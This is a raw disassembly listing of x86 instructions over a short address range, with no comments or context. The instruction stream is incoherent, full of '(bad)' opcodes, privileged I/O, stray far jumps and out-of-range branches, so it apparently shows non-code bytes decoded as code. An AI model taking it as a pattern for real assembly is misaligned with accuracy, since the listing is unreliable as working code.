  41a48e:	xlat   BYTE PTR ds:[ebx]
  41a48f:	sub    eax,0xc4417454
  41a494:	xchg   esp,eax
  41a495:	aaa    
  41a496:	repz jne 0x41a4b0
  41a499:	fldcw  WORD PTR [ebx]
  41a49b:	neg    edi
  41a49d:	jmp    0x2e122119
  41a4a2:	les    edi,FWORD PTR [eax+0x16]
  41a4a5:	xchg   ecx,eax
  41a4a6:	jbe    0x41a4fb
  41a4a8:	inc    eax
  41a4a9:	loope  0x41a469
  41a4ab:	sahf   
  41a4ac:	push   0xffffff89
  41a4ae:	out    0xff,eax
  41a4b0:	out    dx,eax
  41a4b1:	out    0x53,eax
  41a4b3:	jo     0x41a48d
  41a4b5:	cwde   
  41a4b6:	aam    0x61
  41a4b8:	pushf  
  41a4b9:	cld    
  41a4ba:	test   al,0xe7
  41a4bc:	fidiv  DWORD PTR [ebp+0x4c]
  41a4bf:	aaa    
  41a4c0:	fstp   QWORD PTR [ebx+0x2a99c63c]
  41a4c6:	repz shr BYTE PTR [eax+0x77],0x73
  41a4cb:	or     edx,DWORD PTR [esi]
  41a4cd:	outs   dx,DWORD PTR ds:[esi]
  41a4ce:	repz cs jmp 0x76f040d6
  41a4d5:	and    BYTE PTR [ebp+eiz*1+0x2b64010b],al
  41a4dc:	xchg   edi,eax
  41a4dd:	jp     0x41a4d3
  41a4df:	xor    cl,al
  41a4e1:	xchg   esp,eax
  41a4e2:	test   BYTE PTR [ebx+0x17157333],bl
  41a4e8:	sbb    BYTE PTR [ebp+0x33],al
  41a4eb:	push   ss
  41a4ec:	pop    ebx
  41a4ed:	add    DWORD PTR [ebx],edi
  41a4ef:	mov    ch,0xa2
  41a4f1:	push   0x36
  41a4f3:	pop    es
  41a4f4:	mov    cl,0xb
  41a4f6:	iret   
  41a4f7:	adc    eax,0x2ad0bdd3
  41a4fc:	clc    
  41a4fd:	mov    ebx,0xb3379780
  41a502:	xchg   bh,dh
  41a504:	jl     0x41a4a6
  41a506:	and    DWORD PTR [edi+0x6e],ecx
  41a509:	add    al,0x1
  41a50b:	push   cs
  41a50c:	scas   eax,DWORD PTR es:[edi]
  41a50d:	cmp    BYTE PTR [ecx-0x28],ah
  41a510:	ret    
  41a511:	lock xchg edx,eax
  41a513:	mov    ecx,0x59e00786
  41a518:	xor    eax,0x20292ba5
  41a51d:	ss js  0x41a542
  41a520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a521:	sub    al,0x1a
  41a523:	jg     0x41a4ac
  41a525:	mov    dh,0x1c
  41a527:	popf   
  41a528:	mul    DWORD PTR gs:0x34125be5
  41a52f:	xchg   BYTE PTR [ecx-0x38],ah
  41a532:	scas   eax,DWORD PTR es:[edi]
  41a533:	cmp    DWORD PTR [eax+0x5d],edi
  41a536:	dec    ecx
  41a537:	cmc    
  41a538:	mov    esp,0xc385fd3d
  41a53d:	mov    eax,eax
  41a53f:	pop    es
  41a540:	sub    DWORD PTR [ebx+0x66],esp
  41a543:	xor    eax,DWORD PTR [edi]
  41a545:	sti    
  41a546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a547:	scas   al,BYTE PTR es:[edi]
  41a548:	ds mov edx,0x4b866ef3
  41a54e:	push   esi
  41a54f:	loop   0x41a509
  41a551:	cli    
  41a552:	mov    eax,0x2f426737
  41a557:	mov    ah,0x6a
  41a559:	and    DWORD PTR [esi+ebp*8+0x10],ebp
  41a55d:	mov    dh,0x3a
  41a55f:	hlt    
  41a560:	jecxz  0x41a503
  41a562:	mov    ds:0x3bd98550,al
  41a567:	pop    ebx
  41a568:	mov    esp,0xb0473e32
  41a56d:	repnz adc dh,BYTE PTR [esi+0x57]
  41a571:	into   
  41a572:	pop    edx
  41a573:	mov    BYTE PTR [esi+0xee1bb92],ah
  41a579:	cdq    
  41a57a:	imul   BYTE PTR [ebp+0x17215cdf]
  41a580:	mov    DWORD PTR [ebp+0x69],esp
  41a583:	shr    ch,1
  41a585:	push   esi
  41a586:	stc    
  41a587:	sbb    eax,0xf9ebd166
  41a58c:	mov    ebp,cs
  41a58e:	scas   al,BYTE PTR es:[edi]
  41a58f:	mov    BYTE PTR [edx-0x42],dh
  41a592:	lea    esi,[edx-0x7d853c52]
  41a598:	mov    ecx,0x1e5540f0
  41a59d:	sbb    ebx,edi
  41a59f:	adc    dh,BYTE PTR [eax]
  41a5a1:	(bad)  
  41a5a2:	or     edi,DWORD PTR [ecx+ebx*8-0x52]
  41a5a6:	cli    
  41a5a7:	and    DWORD PTR ds:0x919a3c80,ebx
  41a5ad:	(bad)  
  41a5ae:	xchg   esp,eax
  41a5af:	ds push ecx
  41a5b1:	xchg   edi,eax
  41a5b2:	fstp   st(6)
  41a5b4:	shl    ah,1
  41a5b6:	imul   ebx,eax,0xcc2a33d6
  41a5bc:	jg     0x41a62e
  41a5be:	sbb    al,0x11
  41a5c0:	mov    WORD PTR [edi-0x408fbd14],fs
  41a5c6:	stc    
  41a5c7:	pop    ecx
  41a5c8:	mov    ds:0x3677edce,eax
  41a5cd:	dec    DWORD PTR [eax]
  41a5cf:	jbe    0x41a58e
  41a5d1:	out    0xc7,eax
  41a5d3:	adc    eax,0x6913ab2
  41a5d8:	in     eax,0x21
  41a5da:	mov    dl,0x6b
  41a5dc:	pushf  
  41a5dd:	gs pop ebx
  41a5df:	mov    dh,0x45
  41a5e1:	ins    BYTE PTR es:[edi],dx
  41a5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5e3:	adc    DWORD PTR [ecx-0x475a2191],esi
  41a5e9:	xor    ah,BYTE PTR [ebx]
  41a5eb:	gs jmp 0x41a62d
  41a5ee:	test   eax,0x201c1b08
  41a5f3:	aad    0x2e
  41a5f5:	adc    bh,dh
  41a5f7:	test   al,0x61
  41a5f9:	fwait
  41a5fa:	je     0x41a5b8
  41a5fc:	sub    BYTE PTR [edi+0x33],bh
  41a5ff:	shl    BYTE PTR [ecx],cl
  41a601:	sbb    al,cl
  41a603:	(bad)  
  41a604:	fimul  WORD PTR [esi-0x5d]
  41a607:	push   ebx
  41a608:	mov    ebp,0x6bf4f959
  41a60d:	mov    ecx,0x7a19279a
  41a612:	fisttp DWORD PTR [di-0x4e]
  41a616:	enter  0x3a01,0x99
  41a61a:	fnstcw WORD PTR [esi+0x230ad710]
  41a620:	pop    ebx
  41a621:	adc    DWORD PTR [edx+0x15a38f5a],esp
  41a627:	cmp    eax,0x10bfddeb
  41a62c:	mov    ch,BYTE PTR [ecx]
  41a62e:	xchg   edx,eax
  41a62f:	cdq    
  41a630:	(bad)  
  41a631:	fnsave ds:0x8662971c
  41a637:	fdivp  st(6),st
  41a639:	fsub   QWORD PTR [ebx]
  41a63b:	jg     0x41a656
  41a63d:	xchg   DWORD PTR [ecx+0x2d],eax
  41a640:	in     eax,dx
  41a641:	(bad)  
  41a642:	loop   0x41a65f
  41a644:	ret    
  41a645:	dec    edi
  41a646:	adc    DWORD PTR ds:0x8ffed4aa,esp
  41a64c:	call   0x24d59abd
  41a651:	sti    
  41a652:	xor    eax,0xfac9374c
  41a657:	pop    ss
  41a658:	xchg   esp,eax
  41a659:	pusha  
  41a65a:	lahf   
  41a65b:	(bad)  
  41a65d:	xchg   edx,eax
  41a65e:	xor    DWORD PTR [ecx],eax
  41a660:	in     al,0x3f
  41a662:	repz in al,dx
  41a664:	add    ebp,DWORD PTR ds:0xa16dd593
  41a66a:	or     ch,BYTE PTR [eax]
  41a66c:	jg     0x41a6ae
  41a66e:	mov    esp,0x73a9fd4
  41a673:	xchg   ebx,eax
  41a674:	cmp    BYTE PTR [eax+0x6eaf2efd],dl
  41a67a:	sar    BYTE PTR [edx-0x65],cl
  41a67d:	mov    ?,WORD PTR [ebp-0x2897e905]
  41a683:	lods   eax,DWORD PTR ds:[esi]
  41a684:	ins    DWORD PTR es:[edi],dx
  41a685:	lahf   
  41a686:	addr16 pop ds
  41a688:	pop    esp
  41a689:	fsubr  st(1),st
  41a68b:	sbb    edi,DWORD PTR [esi-0x41a3fa71]
  41a691:	jp     0x41a637
  41a693:	hlt    
  41a694:	ins    BYTE PTR es:[edi],dx
  41a695:	scas   eax,DWORD PTR es:[edi]
  41a696:	jmp    0x2967:0x1822aa19
  41a69d:	xchg   esp,eax
  41a69e:	jle    0x41a64f
  41a6a0:	in     al,0x9f
  41a6a2:	test   eax,0xbfc8066f
  41a6a7:	sbb    DWORD PTR [ebp-0x6ce69d7b],edi
  41a6ad:	fsubr  DWORD PTR [edi-0x54]
  41a6b0:	das    
  41a6b1:	aad    0x82
  41a6b3:	or     ebx,DWORD PTR [ecx-0x26]
  41a6b6:	adc    cl,dl
  41a6b8:	aad    0x3d
  41a6ba:	int3   
  41a6bb:	cs data16 in al,dx
  41a6be:	pop    edx
  41a6bf:	fisttp QWORD PTR [ebp+0x1e]
  41a6c2:	pop    ebx
  41a6c3:	inc    edx
  41a6c4:	outs   dx,DWORD PTR ds:[esi]
  41a6c5:	lds    eax,FWORD PTR [ecx+0x50e922eb]
  41a6cb:	cmp    dl,BYTE PTR [ebx]
  41a6cd:	mov    ebx,0x7348bdb4
  41a6d2:	aam    0xe9
  41a6d4:	in     eax,dx
  41a6d5:	jge    0x41a66e
  41a6d7:	jge    0x41a6ec
  41a6d9:	xor    al,0x7d
  41a6db:	mov    ch,BYTE PTR [ebp-0x3e]
  41a6de:	push   ebp
  41a6df:	popa   
  41a6e0:	xchg   esi,eax
  41a6e1:	ins    DWORD PTR es:[edi],dx
  41a6e2:	xor    al,0xdf
  41a6e4:	xchg   esp,eax
  41a6e5:	mov    al,0xe2
  41a6e7:	jns    0x41a753
  41a6e9:	in     al,dx
  41a6ea:	neg    DWORD PTR ds:0xade41d8
  41a6f0:	add    al,0xa7
  41a6f2:	sbb    DWORD PTR [ebp+ecx*8+0x6d],ebx
  41a6f6:	dec    ebx
  41a6f7:	fdivr  st,st(0)
  41a6f9:	and    eax,0x88961fa8
  41a6fe:	int    0x8f
  41a700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a701:	xchg   ebx,eax
  41a702:	pop    esp
  41a703:	fstp   DWORD PTR [eax+0x516af7ed]
  41a709:	and    al,bh
  41a70b:	aas    
  41a70c:	into   
  41a70d:	std    
  41a70e:	out    dx,eax
  41a70f:	sbb    al,0x51
  41a711:	xchg   DWORD PTR [eax-0x2b],ebp
  41a714:	fsubr  QWORD PTR [edi+0x1]
  41a717:	ja     0x41a78a
  41a719:	add    ch,BYTE PTR [ecx]
  41a71b:	clc    
  41a71c:	cli    
  41a71d:	sahf   
  41a71e:	sbb    ebx,eax
  41a720:	arpl   WORD PTR [ebx+0x28],ax
  41a723:	leave  
  41a724:	cli    
  41a725:	hlt    
  41a726:	div    BYTE PTR [ecx+edx*2+0x5e]
  41a72a:	cli    
  41a72b:	(bad)  
  41a72c:	aas    
  41a72d:	jge    0x41a709
  41a72f:	leave  
  41a730:	and    eax,DWORD PTR [esi-0x33cabe89]
  41a736:	xchg   DWORD PTR [ebp-0x40],esp
  41a739:	inc    edx
  41a73a:	cmp    edx,ebx
  41a73c:	xlat   BYTE PTR ds:[ebx]
  41a73d:	out    0xa4,al
  41a73f:	(bad)  
  41a740:	nop
  41a741:	jl     0x41a7c1
  41a743:	mov    cl,ch
  41a745:	popf   
  41a746:	pop    ebx
  41a747:	gs je  0x41a729
  41a74a:	pop    ss
  41a74b:	enter  0xf943,0x5a
  41a74f:	inc    esp
  41a750:	cld    
  41a751:	jo     0x41a70d
  41a753:	push   edx
  41a754:	jmp    0x41a6fb
  41a756:	jno    0x41a6dd
  41a758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a759:	mov    ?,WORD PTR [esi]
  41a75b:	sahf   
  41a75c:	pop    edi
  41a75d:	sub    al,0xa2
  41a75f:	int3   
  41a760:	retf   0x352
  41a763:	jecxz  0x41a71d
  41a765:	mov    ebx,0xdf28de1c
  41a76a:	jp     0x41a71e
  41a76c:	mov    edi,0x67845ebd
  41a771:	cld    
  41a772:	loop   0x41a72f
  41a774:	ds cs popa 
  41a777:	inc    esi
  41a778:	call   0x93ebae3
  41a77d:	pop    ebx
  41a77e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a77f:	(bad)  
  41a780:	cdq    
  41a781:	and    BYTE PTR [edx-0x7c6f3a4b],bh
  41a787:	push   edi
  41a788:	add    eax,0xea421ee4
  41a78d:	push   edx
  41a78e:	cli    
  41a78f:	test   BYTE PTR ss:[eax+0x1103a5aa],cl
  41a796:	sbb    BYTE PTR [ecx-0x70],bl
  41a799:	inc    ecx
  41a79a:	(bad)  
  41a79b:	repnz and eax,0xcfe24790
  41a7a1:	fwait
  41a7a2:	push   ebp
  41a7a3:	(bad)  
  41a7a5:	std    
  41a7a6:	push   0xe2eaf846
  41a7ab:	sub    bh,dl
  41a7ad:	mov    edi,0xc351eb4f
  41a7b2:	and    BYTE PTR [edx+0x2263abd3],ch
  41a7b8:	lock push 0x43
  41a7bb:	test   BYTE PTR [edi-0x478daa6c],0x8d
  41a7c2:	mov    ah,0xdb
  41a7c4:	gs jmp 0x41a7cb
  41a7c7:	jmp    0x9cebbb78
  41a7cc:	jp     0x41a79e
  41a7ce:	fwait
  41a7cf:	lds    esi,FWORD PTR [edi]
  41a7d1:	and    ecx,DWORD PTR [ecx+edx*8]
  41a7d4:	cs shl al,cl
  41a7d7:	rcr    DWORD PTR [ecx+0x65],1
  41a7da:	or     eax,0x5f718e65
  41a7df:	mov    DWORD PTR [edi-0x484dd766],edx
  41a7e5:	mov    dh,0x5
  41a7e7:	cwde   
  41a7e8:	mov    dl,0x46
  41a7ea:	dec    DWORD PTR [ebx+0x1fbfd7e7]
  41a7f0:	fadd   st(2),st
  41a7f2:	mov    cl,0x64
  41a7f4:	inc    esp
  41a7f5:	pop    ebp
  41a7f6:	add    dl,BYTE PTR [ecx+esi*4]
  41a7f9:	pop    esp
  41a7fa:	pop    edi
  41a7fb:	mov    ch,0x40
  41a7fd:	sub    edx,DWORD PTR [eax+0x664d244c]
  41a803:	mov    BYTE PTR [eax],ch
  41a805:	xchg   ebp,eax
  41a806:	dec    eax
  41a807:	ja     0x41a7d4
  41a809:	aad    0x3b
  41a80b:	jmp    0x41a7ae
  41a80d:	pop    esi
  41a80e:	pop    ebp
  41a80f:	iret   
  41a810:	cmp    BYTE PTR [bp+di],al
  41a813:	adc    DWORD PTR [ebx-0x4ac6a265],ebp
  41a819:	popa   
  41a81a:	mov    eax,ds:0x46ffa106
  41a81f:	cmc    
  41a820:	add    eax,DWORD PTR [ecx]
  41a822:	ret    0x5771
  41a825:	call   0xb6df:0x265653c
  41a82c:	pop    es
  41a82d:	(bad)  [ebp+0x1d0d84ec]
  41a833:	fldl2t 
  41a835:	fisttp WORD PTR [edi-0x7712ee]
  41a83b:	jae    0x41a858
  41a83d:	xor    al,0x41
  41a83f:	into   
  41a840:	in     eax,0x14
  41a842:	add    bh,ch
  41a844:	es das 
  41a846:	neg    DWORD PTR [edx]
  41a848:	lods   eax,DWORD PTR ds:[esi]
  41a849:	dec    eax
  41a84a:	cmp    eax,0xaa24fa9a
  41a84f:	pop    eax
  41a850:	mov    dh,0x34
  41a852:	cld    
  41a853:	jg     0x41a826
  41a855:	mov    bl,0xb3
  41a857:	std    
  41a858:	in     eax,0x45
  41a85a:	popf   
  41a85b:	scas   eax,DWORD PTR es:[edi]
  41a85c:	mov    ah,0xc3
  41a85e:	dec    esi
  41a85f:	mov    bl,BYTE PTR [ebp+ebp*4-0x3d]
  41a863:	mov    esp,0x7908b0cc
  41a868:	or     edi,edx
  41a86a:	mov    ah,0x78
  41a86c:	push   edx
  41a86d:	daa    
  41a86e:	xchg   ebp,eax
  41a86f:	sub    al,0xd8
  41a871:	(bad)  
  41a872:	xchg   esi,eax
  41a873:	fimul  DWORD PTR [ebx+0x4d]
  41a876:	fidiv  DWORD PTR [esi+0x25]
  41a879:	stos   DWORD PTR es:[edi],eax
  41a87a:	arpl   si,bp
  41a87c:	sub    DWORD PTR [esi+0x65789155],ebx
  41a882:	(bad)  
  41a883:	sbb    DWORD PTR [eax+0x71d65e5b],esp
  41a889:	out    0x29,al
  41a88b:	retf   0xeeac
  41a88e:	enter  0xb4fb,0xe9
  41a892:	mov    edi,0xe493e72a
  41a897:	fwait
  41a898:	xchg   esi,eax
  41a899:	or     ah,cl
  41a89b:	jle    0x41a866
  41a89d:	jns    0x41a8a9
  41a89f:	pop    edi
  41a8a0:	fwait
  41a8a1:	out    dx,al
  41a8a2:	sbb    ecx,esp
  41a8a4:	lods   al,BYTE PTR ds:[esi]
  41a8a5:	adc    BYTE PTR [ebp-0x13],bh
  41a8a8:	or     eax,0xd7e763a5
  41a8ad:	mov    al,0x43
  41a8af:	jbe    0x41a8b6
  41a8b1:	jns    0x41a8a9
  41a8b3:	mov    edx,0x4391d578
  41a8b8:	int3   
  41a8b9:	(bad)  
  41a8ba:	jbe    0x41a8b2
  41a8bc:	cli    
  41a8bd:	adc    BYTE PTR [edx],al
  41a8bf:	stos   BYTE PTR es:[edi],al
  41a8c0:	clc    
  41a8c1:	dec    eax
  41a8c2:	idiv   BYTE PTR [ebx+0x32]
  41a8c5:	push   edi
  41a8c6:	sub    ebx,esp
  41a8c8:	(bad)  
  41a8c9:	cs dec ebx
  41a8cb:	cld    
  41a8cc:	retf   
  41a8cd:	(bad)  
  41a8ce:	or     DWORD PTR [ecx-0x72],esp
  41a8d1:	in     al,dx
  41a8d2:	cmp    al,0x15
  41a8d4:	mov    eax,ds:0xe27ead0b
  41a8d9:	and    BYTE PTR [ebx+0x16],ah
  41a8dc:	sub    edx,eax
  41a8de:	cmp    dh,BYTE PTR [ecx]
  41a8e0:	xchg   ecx,eax
  41a8e1:	pop    edi
  41a8e2:	fwait
  41a8e3:	jp     0x41a90e
  41a8e5:	ss hlt 
  41a8e7:	or     edi,DWORD PTR [edx]
  41a8e9:	adc    eax,0x171caf5f
  41a8ee:	mov    cl,0x93
  41a8f0:	inc    ebx
  41a8f1:	retf   
  41a8f2:	icebp  
  41a8f3:	(bad)  
  41a8f4:	mov    dl,0xe
  41a8f6:	add    BYTE PTR [edi-0x7e],0x9
  41a8fa:	fnstenv [esi+edi*4]
  41a8fd:	fild   WORD PTR [esi-0x6]
  41a900:	mov    esi,0xd134c932
  41a905:	std    
  41a906:	and    DWORD PTR [ecx+0x14ec8bf3],edi
  41a90c:	jle    0x41a8e3
  41a90e:	mov    edi,0xadbb54bc
  41a913:	pop    esi
  41a914:	cmp    eax,ebp
  41a916:	gs mov bl,0x5c
  41a919:	inc    esp
  41a91a:	(bad)  
  41a91b:	fcmovnu st,st(6)
  41a91d:	mul    DWORD PTR ds:0x84673756
  41a923:	cli    
  41a924:	imul   ebx,ebp,0x36f55270
  41a92a:	cmp    ch,BYTE PTR [edi-0x5]
  41a92d:	or     al,0x8c
  41a92f:	pop    esi
  41a930:	and    eax,0x5873808
  41a935:	idiv   ch
  41a937:	cwde   
  41a938:	clc    
  41a939:	(bad)  
  41a93a:	mov    eax,ds:0x22ab390e
  41a93f:	jle    0x41a8fe
  41a941:	scas   al,BYTE PTR es:[edi]
  41a942:	lock cwde 
  41a944:	push   0xffffff83
  41a946:	and    edx,ebx
  41a948:	sbb    al,0xdb
  41a94a:	ins    DWORD PTR es:[edi],dx
  41a94b:	fbld   TBYTE PTR [ecx-0x5024f762]
  41a951:	js     0x41a95d
  41a953:	xlat   BYTE PTR ds:[ebx]
  41a954:	lods   eax,DWORD PTR ds:[esi]
  41a955:	imul   eax,ebp,0x3245cb16
  41a95b:	dec    edx
  41a95c:	fstp   QWORD PTR [ebx-0x312c9e0c]
  41a962:	int    0xa1
  41a964:	jl     0x41a949
  41a966:	and    al,0x14
  41a968:	fucomi st,st(1)
  41a96a:	daa    
  41a96b:	xchg   ebx,eax
  41a96c:	popa   
  41a96d:	or     esi,edi
  41a96f:	push   es
  41a970:	or     eax,0xe254446a
  41a975:	cli    
  41a976:	inc    esp
  41a977:	sub    eax,DWORD PTR [ebp+ebx*2+0xdbb7e66]
  41a97e:	lods   al,BYTE PTR ds:[esi]
  41a97f:	adc    BYTE PTR [esi],bh
  41a981:	addr16 push ebp
  41a983:	pop    ss
  41a984:	lods   eax,DWORD PTR ds:[esi]
  41a985:	clc    
  41a986:	jl     0x41aa06
  41a988:	fst    QWORD PTR [ecx]
  41a98a:	call   0xf8c3a4c0
  41a98f:	mov    DWORD PTR [esi],edi
  41a991:	jmp    0xf37a6c17
  41a996:	jo     0x41a9d8
  41a998:	mov    edx,0x24cf2b54
  41a99d:	cld    
  41a99e:	fisttp DWORD PTR [ecx+0x1a]
  41a9a1:	fcom   st(7)
  41a9a3:	jmp    0x4040:0x2d4ecab2
  41a9aa:	jb     0x41a96a
  41a9ac:	out    dx,al
  41a9ad:	inc    esp
  41a9ae:	stc    
  41a9af:	rol    BYTE PTR [ebx+ecx*8-0x1a619187],0xa9
  41a9b7:	xor    al,0xb5
  41a9b9:	(bad)  
  41a9ba:	push   ecx
  41a9bb:	jmp    0x41a966
  41a9bd:	cli    
  41a9be:	pop    ds
  41a9bf:	pop    ebx
  41a9c0:	mov    fs,WORD PTR [ecx-0x34]
  41a9c3:	popf   
  41a9c4:	fcom   QWORD PTR [ecx]
  41a9c6:	sub    DWORD PTR [eax-0x3383d7c],ebp
  41a9cc:	(bad)  
  41a9cd:	cmp    al,0x41
  41a9cf:	mov    bl,0x36
  41a9d1:	adc    BYTE PTR [edi],ch
  41a9d3:	mov    dl,0x6e
  41a9d5:	mov    edi,0x30e8523e
  41a9da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9db:	sahf   
  41a9dc:	inc    ebx
  41a9dd:	jle    0x41a9a8
  41a9df:	push   esp
  41a9e0:	(bad)  [eax]
  41a9e2:	xchg   esi,eax
  41a9e3:	jno    0x41a9c5
  41a9e5:	sub    eax,0x5e8112af
  41a9ea:	test   DWORD PTR [ecx-0x20],0x8207b5d3
  41a9f1:	push   edx
  41a9f2:	push   ebp
  41a9f3:	out    dx,al
  41a9f4:	inc    eax
  41a9f5:	mov    ds:0xc60ed49e,al
  41a9fa:	mov    ebx,0xe2959a68
  41a9ff:	dec    ebp
  41aa00:	(bad)  
  41aa01:	in     al,0x9b
  41aa03:	sub    bl,BYTE PTR [ecx+0x7a]
  41aa06:	int    0x79
  41aa08:	pushf  
  41aa09:	mov    ch,BYTE PTR [edx+0x1f]
  41aa0c:	das    
  41aa0d:	test   al,0xde
  41aa0f:	inc    BYTE PTR [ebx]
  41aa11:	cmp    al,BYTE PTR [eax-0x2]
  41aa14:	test   al,0xcf
  41aa16:	pop    ecx
  41aa17:	inc    ecx
  41aa18:	(bad)  
  41aa19:	dec    ebp
  41aa1a:	and    ebp,esi
  41aa1c:	cwde   
  41aa1d:	scas   eax,DWORD PTR es:[edi]
  41aa1e:	mov    eax,0x8830bd82
  41aa23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa24:	mov    al,ds:0xc586a8a6
  41aa29:	inc    ecx
  41aa2a:	push   esi
  41aa2b:	out    0x1d,eax
  41aa2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa2e:	iret   
  41aa2f:	mov    BYTE PTR [edx-0x7],ch
  41aa32:	daa    
  41aa33:	mov    cl,al
  41aa35:	push   edi
  41aa36:	mov    ecx,0x5ee62991
  41aa3b:	inc    esi
  41aa3c:	mov    ecx,0xd5ebfbf
  41aa41:	pop    ecx
  41aa42:	aad    0x38
  41aa44:	(bad)  
  41aa45:	stos   BYTE PTR es:[edi],al
  41aa46:	(bad)  
  41aa47:	jg     0x41a9e0
  41aa49:	cdq    
  41aa4a:	clc    
  41aa4b:	pop    ebp
  41aa4c:	rcl    ecx,1
  41aa4e:	cmp    al,0x36
  41aa50:	xor    ah,ah
  41aa52:	retf   0x8d1e
  41aa55:	(bad)  
  41aa56:	lds    ebx,FWORD PTR [ebx]
  41aa58:	sub    eax,0xd8ce60a8
  41aa5d:	in     al,0xab
  41aa5f:	enter  0x4c08,0x37
  41aa63:	scas   eax,DWORD PTR es:[edi]
  41aa64:	bound  esi,QWORD PTR [ebx]
  41aa66:	sub    eax,0x262a0155
  41aa6b:	in     eax,0x4d
  41aa6d:	pop    eax
  41aa6e:	push   ebx
  41aa6f:	mov    eax,ss
  41aa71:	mov    ecx,0xe5550e07
  41aa76:	ds jl  0x41aab0
  41aa79:	push   0xeb2fe274
  41aa7e:	mov    cl,0x11
  41aa80:	test   DWORD PTR [ecx+0x7c007ab],edi
  41aa86:	xchg   edx,eax
  41aa87:	int    0x4e
  41aa89:	push   ebp
  41aa8a:	arpl   WORD PTR [esi+edi*2-0x35],sp
  41aa8e:	mov    esp,0xac2aba6d
  41aa93:	nop
  41aa94:	popf   
  41aa95:	pop    ebp
  41aa96:	mov    cl,0x12
  41aa98:	push   edx
  41aa99:	jns    0x41aa60
  41aa9b:	adc    al,0xf1
  41aa9d:	mov    esp,0xbd44d356
  41aaa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaa3:	leave  
  41aaa4:	mov    ebx,0x726344a4
  41aaa9:	inc    edx
  41aaaa:	(bad)  
  41aaab:	div    ecx
  41aaad:	enter  0xd9d8,0xd8
  41aab1:	xchg   esi,eax
  41aab2:	test   edx,ecx
  41aab4:	sbb    BYTE PTR [esi],bh
  41aab6:	js     0x41aa39
  41aab8:	xchg   ebx,eax
  41aab9:	mov    WORD PTR [ecx],fs
  41aabb:	xchg   ebx,eax
  41aabc:	(bad)  
  41aabd:	loope  0x41aabe
  41aabf:	jmp    0x41aa9b
  41aac1:	dec    esp
  41aac2:	sub    esp,ebx
  41aac4:	out    0xa1,al
  41aac6:	jg     0x41ab1f
  41aac8:	jmp    0x41aad0
  41aaca:	ins    BYTE PTR es:[edi],dx
  41aacb:	inc    ecx
  41aacc:	call   0xfef7e464
  41aad1:	daa    
  41aad2:	and    eax,0x2883a06
  41aad7:	fsub   QWORD PTR ds:0xf62ac199
  41aadd:	sbb    esi,DWORD PTR [ebx]
  41aadf:	push   ds
  41aae0:	mov    WORD PTR [edi],ss
  41aae2:	and    al,0x50
  41aae4:	mov    ecx,0xa2914050
  41aae9:	jge    0x41ab62
  41aaeb:	aas    
  41aaec:	cdq    
  41aaed:	xchg   ecx,eax
  41aaee:	xchg   DWORD PTR [edx+0x5add2a29],eax
  41aaf4:	add    DWORD PTR ds:0x5d704412,eax
  41aafa:	or     DWORD PTR [ecx-0x4cfdf108],edi
  41ab00:	loop   0x41aaa4
  41ab02:	pop    edi
  41ab03:	adc    DWORD PTR [ecx-0x495f0169],0xda5a55c8
  41ab0d:	add    DWORD PTR [eax],ebp
  41ab0f:	mov    BYTE PTR [edx-0xb],dl
  41ab12:	cdq    
  41ab13:	in     al,dx
  41ab14:	mov    ds:0xafd3e6c9,al
  41ab19:	mov    WORD PTR [edi],ss
  41ab1b:	inc    ecx
  41ab1c:	(bad)  
  41ab1d:	arpl   WORD PTR [eax-0x302b0af],bp
  41ab23:	mov    ch,0xd7
  41ab25:	mov    bh,0xc3
  41ab27:	push   0x6f201e5a
  41ab2c:	retf   0x5ab4
  41ab2f:	test   al,0x37
  41ab31:	dec    dx
  41ab33:	test   eax,0xedfd56c1
  41ab38:	scas   al,BYTE PTR es:[edi]
  41ab39:	scas   al,BYTE PTR es:[edi]
  41ab3a:	mov    cl,cl
  41ab3c:	outs   dx,DWORD PTR ds:[esi]
  41ab3d:	getsec 
  41ab3f:	sbb    DWORD PTR [edx-0x2d5aee0a],ebx
  41ab45:	fadd   DWORD PTR [edi-0x6b01a84d]
  41ab4b:	xor    edi,DWORD PTR [ecx+eax*4+0x34]
  41ab4f:	cmc    
  41ab50:	loope  0x41ab4b
  41ab52:	sahf   
  41ab53:	inc    ebp
  41ab54:	lds    edi,FWORD PTR [ecx]
  41ab56:	cmc    
  41ab57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab58:	add    al,BYTE PTR [eax]
  41ab5a:	mov    ebp,0x99cac963
  41ab5f:	lods   al,BYTE PTR ds:[esi]
  41ab60:	inc    edi
  41ab61:	sub    ecx,DWORD PTR [eax+edx*8+0x70d68851]
  41ab68:	sub    ebx,DWORD PTR [edx-0x343d4b16]
  41ab6e:	jg     0x41ab04
  41ab70:	xchg   edx,eax
  41ab71:	mov    ch,0xf2
  41ab73:	in     al,0x1
  41ab75:	adc    edx,DWORD PTR [ecx+ebp*8+0x3d]
  41ab79:	pop    eax
  41ab7a:	add    eax,0x9fb39338
  41ab7f:	cmp    eax,0x239b23e4
  41ab84:	jecxz  0x41ab3f
  41ab86:	cmp    BYTE PTR [ebx-0x29],0xa
  41ab8a:	inc    ebx
  41ab8b:	pop    esp
  41ab8c:	in     eax,dx
  41ab8d:	lds    ebp,FWORD PTR [esi]
  41ab8f:	add    al,0xa5
  41ab91:	pop    ecx
  41ab92:	and    DWORD PTR [edx+0x72c1234f],0xffffff87
  41ab99:	out    dx,al
  41ab9a:	or     eax,0xd8b36f18
  41ab9f:	jne    0x41abf9
  41aba1:	aam    0xa7
  41aba3:	loopne 0x41ab51
  41aba5:	aas    
  41aba6:	imul   ecx,DWORD PTR [eax],0x470afd45
  41abac:	cmp    al,0xd
  41abae:	xor    BYTE PTR [edx-0x1a6e0de],dh
  41abb4:	imul   eax,DWORD PTR [ecx-0x17],0xffffffe3
  41abb8:	fldcw  WORD PTR [ebx]
  41abba:	sahf   
  41abbb:	pop    ecx
  41abbc:	dec    esi
  41abbd:	jmp    0x41abb0
  41abbf:	push   es
  41abc0:	xor    esp,DWORD PTR [eax]
  41abc2:	jmp    0x41abce
  41abc4:	test   al,0x8e
